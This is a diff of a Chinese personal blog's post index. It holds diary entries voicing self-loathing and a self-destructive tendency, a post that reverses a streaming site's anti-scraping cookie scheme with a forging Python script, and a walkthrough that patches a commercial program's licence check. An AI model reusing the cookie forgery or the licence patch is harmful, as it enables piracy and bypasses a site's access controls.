-    <title>日记 20240208</title>
-    <url>/articles/diary/diary20240208/</url>
-    <content><![CDATA[看着四周热闹的人群，我不知道我在其中扮演着什么，我又在感受着什么。
-我只是一味的堆砌起笑容，迎合着他人的不知道是真是假的笑容。
-我仿佛不属于这个世界，周围的快乐，幸福与我无关。
-坐在回宿舍的路上，突然有点想哭，但是我心里又对我这种想哭的感觉感到好笑。
-哈哈，好似好似好似好似好似好似好似好似好似好似好似好似好似好似好似好似。
-情绪是最没有意义的事情，我不知道我为什么会有这个想法。
-也许是只有压抑住我的情绪，才能抑制住我逐渐增大的自我毁灭倾向。
-你确实不配得到爱，你确实不配被爱。
-回应我的只是心脏一阵又一阵的抽痛。
-Ayankeya
-2024.02.08 除夕夜
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 20221001 - 2</title>
-    <url>/articles/diary/ri-ji-20221002/</url>
-    <content><![CDATA[稍微写点流水账日记。
-
-
-covid-19终于阴性了，下周开始可以去上课了，舒服了。但是这周落下的课程，很多都没有录像，光靠notes还是挺困难的，但总归还是大概或许也许可以跟上？
-先是实习的面试，个人认为我和interviewer相谈甚欢，他提的问题我基本都能够回答，唯一不能确定的是我没有实习经历，不知道他们是怎么感觉的。
-问题是，我发了这么多简历，现在给我面试机会的就一个啊，气死我了气死我了气死我了气死我了气死我了。
-老毛病又开始犯了，每当快要睡着的时候，就会出现又哭又笑的幻听，这几次除了心悸和全身发麻之外还外加呼吸困难，真的有点快死了的感觉。
-真不知道未来是啥
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 20221012</title>
-    <url>/articles/diary/ri-ji-20221012/</url>
-    <content><![CDATA[
-
-计算了一下，每天5公里的计划也快到一个月了。大概来说说感受吧。
-我一开始跑步的目的是为了降低心率，开学的时候测了一下，发现坐着不动的时候的心率就有95-105了。如果再这样下去，迟早要寄，所以就打算开始跑步，把体质提一提。
-但是很可惜的是，我的目的似乎没有达到，心率还是一样的高。。。
-但是，就单纯跑5km来说，现在已经比刚刚开始轻松了不少，所以大概还是有作用的吧?
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
       </tags>
   </entry>
   <entry>
@@ -5924,323 +5647,6 @@ http://blog.redrocket.club/2019/04/11/midnightsunctf-quals-2019-gissa2/
         <tag>pwn</tag>
         <tag>ctf</tag>
         <tag>seccomp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>agefans视频解析逆向</title>
-    <url>/articles/ctf/agefans-shi-pin-jie-xi-ni-xiang/</url>
-    <content><![CDATA[前言最近在做爬虫项目，发现一个动漫网站挺好，可以这个视频解析似乎有加密，最近正好有空，看了一下这个解密是怎么做出来的
-准备介绍一下今天的对象 agefans。
-那么首先开F12看看http有哪些请求。 然后这网站甚至还开了清console和不停debug来阻止我们使用开发者工具。
-
-但是没有关系，把breakpoint关掉就行了。
-
-简单的分析先搜索一下视频文件在哪里出现了，
-可以发现视频地址是在 _getplay2 这个api中得到的，
-进一步分析可以得到_getplayer2是通过_getplay 302 跳转的。
-
-
-比如, https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1, 会302跳转到 https://www.agefans.cc/_getplay2?kp=xxxxxxxxxxxxxx 最后获得视频地址。
-但是，直接访问 https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1 无法得到302跳转，反而会返回 err:timeout. 所以猜测有一个鉴权。
-仔细的分析搜索 _getplay?, 在 s_playpre.js 中发现了他的踪迹
-function __cb_getplay_url()&#123;
-    &#x2F;&#x2F;
-    const _url &#x3D; window.location.href;
-    const _rand &#x3D; Math.random();
-    var _getplay_url &#x3D; (_url.replace(&#x2F;.*\&#x2F;play\&#x2F;(\d&#123;8&#125;)-(\d+?)-(\d+?)\.html.*&#x2F;, &#39;&#x2F;_getplay?aid&#x3D;$1&amp;playindex&#x3D;$2&amp;epindex&#x3D;$3&#39;) + &#39;&amp;r&#x3D;&#39; + _rand);
-    &#x2F;&#x2F;
-    var re_resl &#x3D; _getplay_url.match(&#x2F;[&amp;?]+epindex&#x3D;(\d+)&#x2F;);
-    const hf_epi &#x3D; (&#39;&#39; + FEI2(re_resl[1]));
-    const t_epindex_ &#x3D; &#39;epindex&#x3D;&#39;;
-    _getplay_url &#x3D; _getplay_url.replace(t_epindex_ + re_resl[1], t_epindex_ + hf_epi);
-    return _getplay_url;
-&#125;
-
-继续看哪些地方调用了__cb_getplay_url, 
-找到发送请求的地方, 
-简单分析一下这个用来处理权限问题的函数应该为getplay_pck() 以及 getplay_pck2().
-function __getset_play(_in_id, cb_getplay_url, cb_cnt)&#123;
-    &#x2F;&#x2F;
-    const _url &#x3D; window.location.href;
-    const _rand &#x3D; Math.random();
-    const _getplay_url &#x3D; cb_getplay_url();
-    if(dettchk())&#123;
-      $.get(_getplay_url, function(_in_data, _in_status)&#123;
-          if(&#39;err:timeout&#39; &#x3D;&#x3D; _in_data)&#123;
-            if(cb_cnt &gt; 0)&#123;
-              __getplay_pck();
-              __getplay_pck2();
-              return __getset_play(_in_id, cb_getplay_url, cb_cnt-1);
-            &#125;else &#123;
-              return false;
-            &#125;
-          &#125;
-          &#x2F;&#x2F; ignored
-
-同理，搜索getplay_pck() 以及 getplay_pck2(), 发现他们分别出现在 s_runtimelib.js 和 s_dett.js中
-但是这两个是加密的, 我们得对他们进行一波解密。
-特殊的分析在进行解密之前，我们先大概看一下服务器是如何鉴定正常的请求
-如下是一个请求
-在经过几次试验后，可以发现:
-
-这个请求可以正常获取到数据一定时间，过了一定时间后就会失效并且返回err:timeout.
-除了referer之外, 要获取到正常数据，还需要cookie，可能是是t1,k2,k2,t2
-
-GET &#x2F;_getplay?aid&#x3D;20210249&amp;playindex&#x3D;2&amp;epindex&#x3D;1&amp;r&#x3D;0.7315117942661356 HTTP&#x2F;1.1
-Host: www.agefans.cc
-Connection: close
-Pragma: no-cache
-Cache-Control: no-cache
-sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;94&quot;, &quot;Google Chrome&quot;;v&#x3D;&quot;94&quot;, &quot;;Not A Brand&quot;;v&#x3D;&quot;99&quot;
-Accept: *&#x2F;*
-X-Requested-With: XMLHttpRequest
-sec-ch-ua-mobile: ?0
-User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36
-sec-ch-ua-platform: &quot;Windows&quot;
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https:&#x2F;&#x2F;www.agefans.cc&#x2F;play&#x2F;20210249?playid&#x3D;2_1
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q&#x3D;0.9
-Cookie: ck_volume&#x3D;0.18; fa_c&#x3D;1; Hm_lvt_7fdef555dc32f7d31fadd14999021b7b&#x3D;1634075310,1634227432; Hm_lpvt_7fdef555dc32f7d31fadd14999021b7b&#x3D;1634227432; t1&#x3D;1634227492738; k1&#x3D;372490656; k2&#x3D;71052386557371; t2&#x3D;1634227447871; fa_t&#x3D;1634227447913
-
-
-同时，失败的请求会返回 set-cookie, 如下
-set-cookie设置了t1以及k1, 
-HTTP&#x2F;1.1 200 OK
-Date: Thu, 14 Oct 2021 16:07:43 GMT
-Content-Type: text&#x2F;plain; charset&#x3D;utf-8
-Content-Length: 11
-Connection: close
-Set-Cookie: t1&#x3D;1634227713016; Path&#x3D;&#x2F;
-Set-Cookie: k1&#x3D;382912592; Path&#x3D;&#x2F;
-X-XSS-Protection: 1; mode&#x3D;block
-X-Content-Type-Options: nosniff
-Access-Control-Allow-Origin: https:&#x2F;&#x2F;web.age-spa.com:8443
-Access-Control-Allow-Methods: GET, POST, OPTIONS
-Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization
-Access-Control-Allow-Credentials: true
-Cache-Control: no-store
-Strict-Transport-Security: max-age&#x3D;31536000; includeSubDomains; preload
-CF-Cache-Status: DYNAMIC
-Expect-CT: max-age&#x3D;604800, report-uri&#x3D;&quot;https:&#x2F;&#x2F;report-uri.cloudflare.com&#x2F;cdn-cgi&#x2F;beacon&#x2F;expect-ct&quot;
-Server: cloudflare
-CF-RAY: 69e20ff0ae286040-SEA
-
-err:timeout
-
-所以，综合分析可以得知，首先我们需要获取t1, k2. 然后通过一定的算法，生成t2,k2并保存在cookie中，再次发送请求就可以获得数据了
-加密的分析先来看一下这两文件长什么样
-
-简单分析后得知, 加密后的代码大概分为三个部分
-
-数据段，包括对数据进行进一步处理
-解密函数
-加密代码段
-
-那么要解密也很简单了，只要把加密的地方，例如_0x1705(&quot;xx&quot;,&quot;bbb&quot;)通过解密函数解密即可。
-当然函数名是是还原不了了。
-function __getplay_pck2() &#123;
-;var encode_version &#x3D; &#39;加密类型版本&#39;
-      , fwiba &#x3D; &#39;__0x9ecf8&#39;
-      , __0x9ecf8 &#x3D; [&#39;数据&#39;];
-     &#x2F;&#x2F; 处理数据 
-    (function(_0x25c7a5, _0x422073) &#123;
-        var _0x25cb8a &#x3D; function(_0x355576) &#123;
-            while (--_0x355576) &#123;
-                _0x25c7a5[&#39;push&#39;](_0x25c7a5[&#39;shift&#39;]());
-            &#125;
-        &#125;;
-        _0x25cb8a(++_0x422073);
-    &#125;(__0x9ecf8, 0x1db));
-    &#x2F;&#x2F; 解密函数
-    var _0x1705 &#x3D; function(_0x501411, _0x17d72d) &#123;&#125;
-
-    &#x2F;&#x2F; 加密后的原始代码
-    xxx[_0x1705(xxx,xxx)] &#x3D; xxx
-&#125;
-
-知道了解密方法之后我们来看一下用来做验证的两个函数到底干了什么
-getplay_pck()首先是犯下首先之罪的 __getplay_pck(),
-猜测一下f大概就是获得cookie的值，然后f2大概就是设置cookie的值。
-如下图分析，这段算法首先获取了t1的值，然后把t1除 0x3e8 (1000) 四舍五入取整，最后右移5位
-k2可通过一段不明意义的计算获取
-t2为当前时间
-&#x2F;&#x2F; get cookie t1 
-&#x2F;&#x2F; t1 &#x3D; Math.round(Number(f(&#39;t1&#39;)) &#x2F; 0x3e8) &gt;&gt; 0x5;
-t1 &#x3D; Math[&#39;round&#39;](Number(f(&#39;t1&#39;)) &#x2F; 0x3e8) &gt;&gt; 0x5;
-
-&#x2F;&#x2F; set cookie k2
-&#x2F;&#x2F; k2 &#x3D; (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1
-f2(&#39;k2&#39;, (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1);
-
-&#x2F;&#x2F; set cookie t2
-&#x2F;&#x2F; k2 &#x3D;  new Date().getTime()+&quot;&quot;
-f2(&#39;t2&#39;, new Date()[_0x1705(&#39;0x12&#39;, &#39;bPNz&#39;)]());
-
-
-getplay_pck2()然后是是犯下然后之罪的 __getplay_pck2()
-通过分析得知，首先获取k2的最后一个数字，然后获取一个t2，使这个t2的最后三个数字包含k2的最后一个数字
-结束
-&#x2F;&#x2F; ksub &#x3D; k2[-1]
-ksub &#x3D; f(&#39;k2&#39;)[&#39;slice&#39;](-0x1);
-&#x2F;&#x2F; while true
-while (!![]) &#123;
-	&#x2F;&#x2F; t2 &#x3D;  new Date().getTime()
-    t2 &#x3D; new Date()[&#39;getTime&#39;]();
-    &#x2F;&#x2F; if t2.toString().slice(-0x3).indexOf(ksub) &gt;&#x3D; 0
-    if (t2[&#39;toString&#39;]()[&#39;slice&#39;](-0x3)[_0x1691(&#39;0x12&#39;, &#39;9f@X&#39;)](ksub) &gt;&#x3D; 0x0) &#123;
-    	&#x2F;&#x2F; set cookie t2 &#x3D; t2
-        f2(&#39;t2&#39;, t2);
-        break;
-    &#125;
-&#125;
-
-&quot;keygen&quot;那么知道了是如何完成验证的，那么就可以开始写解析了，先来整理一下步骤
-其实k1没什么用
-
-访问_getplay，获得t1
-通过以上方式获得cookie
-加上cookie再次访问获得链接
-
-import math
-import re
-import time
-
-import requests
-
-
-def getcookie(t1:int):
-    time_now = int(time.time()*1000)
-    print("t1 is %d, now is %s, t1-time_now = %d"%(t1,time_now,t1-time_now))
-    t1_tmp = math.floor(t1 / 1000 + 0.5) >> 0x5
-    k2 = (t1_tmp * (t1_tmp % 0x1000) * 0x3 + 0x1450f) * (t1_tmp % 0x1000) + t1_tmp
-    t2 = time_now
-    k2_s = str(k2)
-    t2_s = str(t2)
-    t2_s = t2_s[:-1:]+k2_s[-1]
-    print("k2=%s" % k2_s)
-    print("t2=%s" % t2_s)
-    return &#123;"t2":t2_s,"k2":k2_s&#125;
-
-url = "https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1"
-data = requests.head(url,headers=&#123;"referer":"https://www.agefans.cc/",&#125;)
-print(data)
-setcookies = data.headers.get("set-cookie")
-print(setcookies)
-t1 = int(re.compile(r"t1=[^;]*;").search(setcookies).group()[3:-1:])
-print(t1)
-cookies = getcookie(t1)
-cookies["t1"] = str(t1)
-data = requests.get(url,headers=&#123;"referer":"https://www.agefans.cc/",&#125;,cookies=cookies)
-print(data.text)
-
-成功获得直链~
-&lt;Response [200]&gt;
-t1&#x3D;1634231445902; Path&#x3D;&#x2F;, k1&#x3D;586623324; Path&#x3D;&#x2F;
-1634231445902
-t1 is 1634231445902, now is 1634231395254, t1-time_now &#x3D; 50648
-k2&#x3D;99036993616128
-t2&#x3D;1634231395258
-
-	&#123;
-		&quot;purl&quot;:&quot;&#x2F;age&#x2F;player&#x2F;ckx1&#x2F;?url&#x3D;&quot;,
-		&quot;purlf&quot;:&quot;https:&#x2F;&#x2F;play.agefans.cc:8443&#x2F;age&#x2F;player&#x2F;dpx&#x2F;?url&#x3D;&quot;,
-		&quot;vurl&quot;:&quot;https%3a%2f%2fkol%2dfans%2efp%2eps%2enetease%2ecom%2ffile%2f6159a40954eace75cb975131raYEy7we03?from%3Dysjdm.com%7Cysjdm.net&quot;,
-		&quot;playid&quot;:&quot;&lt;play&gt;web_mp4&lt;&#x2F;play&gt;&quot;,
-		&quot;vurl_bak&quot;:&quot;&quot;,
-		&quot;purl_mp4&quot;:&quot;&#x2F;age&#x2F;player&#x2F;ckx1&#x2F;?url&#x3D;&quot;,
-		&quot;ex&quot;:&quot;&quot;
-	&#125;
-
-
-碎碎念整这么麻烦干什么。
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>javascript</tag>
-        <tag>anime</tag>
-        <tag>reverse</tag>
-        <tag>encryption</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MagicEXIF破解思路之VB程序破解</title>
-    <url>/articles/ctf/cracking-magicexif/</url>
-    <content><![CDATA[从0开始的VB程序破解上周，为了整点乐子，我打算寻找一个简单的软件来进行破解。正好某群友有一个需要破解的应用，于是这个应用就不幸的成为了我的目标。
-开始之前先来介绍一下这个程序，MagicEXIF一个非常强大的图片元数据编辑器。 分为免费版，专业版，旗舰版。 
-安装完程序后，先来看看程序的基本信息
-
-
-
-一个使用Visual Basic编写的程序，且是32位的应用。 再来看看BinaryNinja的反编译结果。
-我的评价是惨不忍睹，各种变量混在一起使用，字符串甚至是直接存在函数体里面的，只能说挺离谱的。
-
-总的来说，直接看反编译的代码难度较大，不是很好整。 我又尝试了IDA，结果也是一样。
-所以我得找点别的方法
-简单进行了一下google，发现VB的程序实际上是运行在一个类似VB虚拟机上的程序。 
-简单来说，VB程序可以大致分为两个部分，一个为窗体部分，一个为代码部分。窗体部分主要负责软件界面的大致框架，代码部分则是由Pcode组成的一个个函数。 窗体部分通过调用不同的函数来实现不同的效果。
-网上正好有一个decompiler可以反编译VB程序 (VB Decompiler)，我把软件本体和decompiler都拖到沙箱里开始分析。
-程序分析打开VB Decompiler, 把fast decompile的勾给去掉，等待反编译完成。
-可以看到注册的功能是在窗体frmRegister下的
-
-在code段找到对应的代码，一个个点进去进行分析，我们可以得到用户名的长度必须大于8，注册码的长度为64。（因为只有这样激活按钮才可以被按）
-
-继续看激活的过程，具体代码位于cmdActivate_click中，可以发现一旦激活成功后，软件会将激活信息明文储存在reg_info.cfg文件里，这个文件包含用户名，注册码，以及注册模式。注册模式这个之后会说。
-
-观察软件对全局变量的修改与读取，我们同样可以知道0x68002c储存了软件的版本信息（即未注册，专业，旗舰）。 在BN里查找code reference之后，我们也可以推断出每个版本对应的数值。
-0x87 &#x3D; 旗舰版
-0x63 &#x3D; 专业版
-0x1 &#x3D; 免费版
-
-
-激活完成后，程序会跳出一个窗口让用户重启，在这里可以合理推断验证注册码的代码会在程序启动的时候运行。
-因为注册信息保存在reg_info.cfg里，这就给了我一个很好的突破口，查找哪些函数使用了reg_info.cfg这个字符串。于是我们就可以顺藤摸瓜找到对应的函数0x573BD0。
- 
-可以看到软件先在软件的安装目录下加载了reg_info.cfg文件，并读取了保存的激活信息
-从中我们也可以在发现几个重要的全局变量，0x680034保存了用户名(UserName)，0x680038保存了注册码(ActivationCode)，0x680032保存了激活模式(RegMode)。
-再来看具体的注册码验证部分，简单概括一下逻辑
-如果注册模式(RegMode为1),那么会调用第一个验证函数0x56e360检查注册码，如果注册模式为0，那么则会调用第二个验证函数0x56e9b0。
- 
-这两个验证函数都会返回一个值，这个值会赋值给0x68002c也就是软件版本。
-同时，这两个函数也会设置0x680030的值。 查看这个的值的cross reference，我们可以知道这个值代表了授权模式。 
-0 永久授权
-1 企业永久授权
-2 个人授权（时间有限）
-
- 
-这也是为什么在注册码验证的那部分里，如果这个值是2(也就是不是永久验证)，他会去检查到期时间来确保验证码没有过期。
-破解了解了程序具体的具体验证思路，那么就可以进行破解了。
-破解的思路比较粗暴，直接给那两个验证函数(0x56e360,0x56e9b0)打补丁，让那两个返回我们要的版本号，设置授权模式为我们想要的模式即可
-; 设置为旗舰版（实际上没用这个代码没用
-mov word [0x68002c], 0x87 
-; 设置为企业永久激活
-mov word [0x680030], 1
-; 设置返回值为旗舰版
-xor eax,eax
-mov eax, 0x87
-ret
-
- 
-然后在程序目录下新建注册信息 reg_info.cfg
-填入注册信息即可
- 
-效果 
-未解决的问题如果我们再次用cross reference查找哪些地方调用注册码验证函数，我们发现了一个类似初始化函数的代码。
- 
-如图所示，我们可以发现他一共调用了两次验证函数，第一次使用arg3=0，第二次使用arg3=-1。
-奇怪的是，不管第一次的reg mode是啥，第二次都会变成0，运行一次第二个验证函数。 所以实际上只要给第二个验证函数打补丁就可以了。
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>crack</tag>
-        <tag>reverse</tag>
-        <tag>visual basic</tag>
       </tags>
   </entry>
   <entry>
@@ -6963,9 +6369,326 @@ Building Electron patched V8todo
       <tags>
         <tag>ctf</tag>
         <tag>javascript</tag>
-        <tag>reverse</tag>
         <tag>v8</tag>
+        <tag>reverse</tag>
         <tag>bytecode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>agefans视频解析逆向</title>
+    <url>/articles/ctf/agefans-shi-pin-jie-xi-ni-xiang/</url>
+    <content><![CDATA[前言最近在做爬虫项目，发现一个动漫网站挺好，可以这个视频解析似乎有加密，最近正好有空，看了一下这个解密是怎么做出来的
+准备介绍一下今天的对象 agefans。
+那么首先开F12看看http有哪些请求。 然后这网站甚至还开了清console和不停debug来阻止我们使用开发者工具。
+
+但是没有关系，把breakpoint关掉就行了。
+
+简单的分析先搜索一下视频文件在哪里出现了，
+可以发现视频地址是在 _getplay2 这个api中得到的，
+进一步分析可以得到_getplayer2是通过_getplay 302 跳转的。
+
+
+比如, https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1, 会302跳转到 https://www.agefans.cc/_getplay2?kp=xxxxxxxxxxxxxx 最后获得视频地址。
+但是，直接访问 https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1 无法得到302跳转，反而会返回 err:timeout. 所以猜测有一个鉴权。
+仔细的分析搜索 _getplay?, 在 s_playpre.js 中发现了他的踪迹
+function __cb_getplay_url()&#123;
+    &#x2F;&#x2F;
+    const _url &#x3D; window.location.href;
+    const _rand &#x3D; Math.random();
+    var _getplay_url &#x3D; (_url.replace(&#x2F;.*\&#x2F;play\&#x2F;(\d&#123;8&#125;)-(\d+?)-(\d+?)\.html.*&#x2F;, &#39;&#x2F;_getplay?aid&#x3D;$1&amp;playindex&#x3D;$2&amp;epindex&#x3D;$3&#39;) + &#39;&amp;r&#x3D;&#39; + _rand);
+    &#x2F;&#x2F;
+    var re_resl &#x3D; _getplay_url.match(&#x2F;[&amp;?]+epindex&#x3D;(\d+)&#x2F;);
+    const hf_epi &#x3D; (&#39;&#39; + FEI2(re_resl[1]));
+    const t_epindex_ &#x3D; &#39;epindex&#x3D;&#39;;
+    _getplay_url &#x3D; _getplay_url.replace(t_epindex_ + re_resl[1], t_epindex_ + hf_epi);
+    return _getplay_url;
+&#125;
+
+继续看哪些地方调用了__cb_getplay_url, 
+找到发送请求的地方, 
+简单分析一下这个用来处理权限问题的函数应该为getplay_pck() 以及 getplay_pck2().
+function __getset_play(_in_id, cb_getplay_url, cb_cnt)&#123;
+    &#x2F;&#x2F;
+    const _url &#x3D; window.location.href;
+    const _rand &#x3D; Math.random();
+    const _getplay_url &#x3D; cb_getplay_url();
+    if(dettchk())&#123;
+      $.get(_getplay_url, function(_in_data, _in_status)&#123;
+          if(&#39;err:timeout&#39; &#x3D;&#x3D; _in_data)&#123;
+            if(cb_cnt &gt; 0)&#123;
+              __getplay_pck();
+              __getplay_pck2();
+              return __getset_play(_in_id, cb_getplay_url, cb_cnt-1);
+            &#125;else &#123;
+              return false;
+            &#125;
+          &#125;
+          &#x2F;&#x2F; ignored
+
+同理，搜索getplay_pck() 以及 getplay_pck2(), 发现他们分别出现在 s_runtimelib.js 和 s_dett.js中
+但是这两个是加密的, 我们得对他们进行一波解密。
+特殊的分析在进行解密之前，我们先大概看一下服务器是如何鉴定正常的请求
+如下是一个请求
+在经过几次试验后，可以发现:
+
+这个请求可以正常获取到数据一定时间，过了一定时间后就会失效并且返回err:timeout.
+除了referer之外, 要获取到正常数据，还需要cookie，可能是是t1,k2,k2,t2
+
+GET &#x2F;_getplay?aid&#x3D;20210249&amp;playindex&#x3D;2&amp;epindex&#x3D;1&amp;r&#x3D;0.7315117942661356 HTTP&#x2F;1.1
+Host: www.agefans.cc
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;94&quot;, &quot;Google Chrome&quot;;v&#x3D;&quot;94&quot;, &quot;;Not A Brand&quot;;v&#x3D;&quot;99&quot;
+Accept: *&#x2F;*
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36
+sec-ch-ua-platform: &quot;Windows&quot;
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https:&#x2F;&#x2F;www.agefans.cc&#x2F;play&#x2F;20210249?playid&#x3D;2_1
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie: ck_volume&#x3D;0.18; fa_c&#x3D;1; Hm_lvt_7fdef555dc32f7d31fadd14999021b7b&#x3D;1634075310,1634227432; Hm_lpvt_7fdef555dc32f7d31fadd14999021b7b&#x3D;1634227432; t1&#x3D;1634227492738; k1&#x3D;372490656; k2&#x3D;71052386557371; t2&#x3D;1634227447871; fa_t&#x3D;1634227447913
+
+
+同时，失败的请求会返回 set-cookie, 如下
+set-cookie设置了t1以及k1, 
+HTTP&#x2F;1.1 200 OK
+Date: Thu, 14 Oct 2021 16:07:43 GMT
+Content-Type: text&#x2F;plain; charset&#x3D;utf-8
+Content-Length: 11
+Connection: close
+Set-Cookie: t1&#x3D;1634227713016; Path&#x3D;&#x2F;
+Set-Cookie: k1&#x3D;382912592; Path&#x3D;&#x2F;
+X-XSS-Protection: 1; mode&#x3D;block
+X-Content-Type-Options: nosniff
+Access-Control-Allow-Origin: https:&#x2F;&#x2F;web.age-spa.com:8443
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization
+Access-Control-Allow-Credentials: true
+Cache-Control: no-store
+Strict-Transport-Security: max-age&#x3D;31536000; includeSubDomains; preload
+CF-Cache-Status: DYNAMIC
+Expect-CT: max-age&#x3D;604800, report-uri&#x3D;&quot;https:&#x2F;&#x2F;report-uri.cloudflare.com&#x2F;cdn-cgi&#x2F;beacon&#x2F;expect-ct&quot;
+Server: cloudflare
+CF-RAY: 69e20ff0ae286040-SEA
+
+err:timeout
+
+所以，综合分析可以得知，首先我们需要获取t1, k2. 然后通过一定的算法，生成t2,k2并保存在cookie中，再次发送请求就可以获得数据了
+加密的分析先来看一下这两文件长什么样
+
+简单分析后得知, 加密后的代码大概分为三个部分
+
+数据段，包括对数据进行进一步处理
+解密函数
+加密代码段
+
+那么要解密也很简单了，只要把加密的地方，例如_0x1705(&quot;xx&quot;,&quot;bbb&quot;)通过解密函数解密即可。
+当然函数名是是还原不了了。
+function __getplay_pck2() &#123;
+;var encode_version &#x3D; &#39;加密类型版本&#39;
+      , fwiba &#x3D; &#39;__0x9ecf8&#39;
+      , __0x9ecf8 &#x3D; [&#39;数据&#39;];
+     &#x2F;&#x2F; 处理数据 
+    (function(_0x25c7a5, _0x422073) &#123;
+        var _0x25cb8a &#x3D; function(_0x355576) &#123;
+            while (--_0x355576) &#123;
+                _0x25c7a5[&#39;push&#39;](_0x25c7a5[&#39;shift&#39;]());
+            &#125;
+        &#125;;
+        _0x25cb8a(++_0x422073);
+    &#125;(__0x9ecf8, 0x1db));
+    &#x2F;&#x2F; 解密函数
+    var _0x1705 &#x3D; function(_0x501411, _0x17d72d) &#123;&#125;
+
+    &#x2F;&#x2F; 加密后的原始代码
+    xxx[_0x1705(xxx,xxx)] &#x3D; xxx
+&#125;
+
+知道了解密方法之后我们来看一下用来做验证的两个函数到底干了什么
+getplay_pck()首先是犯下首先之罪的 __getplay_pck(),
+猜测一下f大概就是获得cookie的值，然后f2大概就是设置cookie的值。
+如下图分析，这段算法首先获取了t1的值，然后把t1除 0x3e8 (1000) 四舍五入取整，最后右移5位
+k2可通过一段不明意义的计算获取
+t2为当前时间
+&#x2F;&#x2F; get cookie t1 
+&#x2F;&#x2F; t1 &#x3D; Math.round(Number(f(&#39;t1&#39;)) &#x2F; 0x3e8) &gt;&gt; 0x5;
+t1 &#x3D; Math[&#39;round&#39;](Number(f(&#39;t1&#39;)) &#x2F; 0x3e8) &gt;&gt; 0x5;
+
+&#x2F;&#x2F; set cookie k2
+&#x2F;&#x2F; k2 &#x3D; (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1
+f2(&#39;k2&#39;, (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1);
+
+&#x2F;&#x2F; set cookie t2
+&#x2F;&#x2F; k2 &#x3D;  new Date().getTime()+&quot;&quot;
+f2(&#39;t2&#39;, new Date()[_0x1705(&#39;0x12&#39;, &#39;bPNz&#39;)]());
+
+
+getplay_pck2()然后是是犯下然后之罪的 __getplay_pck2()
+通过分析得知，首先获取k2的最后一个数字，然后获取一个t2，使这个t2的最后三个数字包含k2的最后一个数字
+结束
+&#x2F;&#x2F; ksub &#x3D; k2[-1]
+ksub &#x3D; f(&#39;k2&#39;)[&#39;slice&#39;](-0x1);
+&#x2F;&#x2F; while true
+while (!![]) &#123;
+	&#x2F;&#x2F; t2 &#x3D;  new Date().getTime()
+    t2 &#x3D; new Date()[&#39;getTime&#39;]();
+    &#x2F;&#x2F; if t2.toString().slice(-0x3).indexOf(ksub) &gt;&#x3D; 0
+    if (t2[&#39;toString&#39;]()[&#39;slice&#39;](-0x3)[_0x1691(&#39;0x12&#39;, &#39;9f@X&#39;)](ksub) &gt;&#x3D; 0x0) &#123;
+    	&#x2F;&#x2F; set cookie t2 &#x3D; t2
+        f2(&#39;t2&#39;, t2);
+        break;
+    &#125;
+&#125;
+
+&quot;keygen&quot;那么知道了是如何完成验证的，那么就可以开始写解析了，先来整理一下步骤
+其实k1没什么用
+
+访问_getplay，获得t1
+通过以上方式获得cookie
+加上cookie再次访问获得链接
+
+import math
+import re
+import time
+
+import requests
+
+
+def getcookie(t1:int):
+    time_now = int(time.time()*1000)
+    print("t1 is %d, now is %s, t1-time_now = %d"%(t1,time_now,t1-time_now))
+    t1_tmp = math.floor(t1 / 1000 + 0.5) >> 0x5
+    k2 = (t1_tmp * (t1_tmp % 0x1000) * 0x3 + 0x1450f) * (t1_tmp % 0x1000) + t1_tmp
+    t2 = time_now
+    k2_s = str(k2)
+    t2_s = str(t2)
+    t2_s = t2_s[:-1:]+k2_s[-1]
+    print("k2=%s" % k2_s)
+    print("t2=%s" % t2_s)
+    return &#123;"t2":t2_s,"k2":k2_s&#125;
+
+url = "https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1"
+data = requests.head(url,headers=&#123;"referer":"https://www.agefans.cc/",&#125;)
+print(data)
+setcookies = data.headers.get("set-cookie")
+print(setcookies)
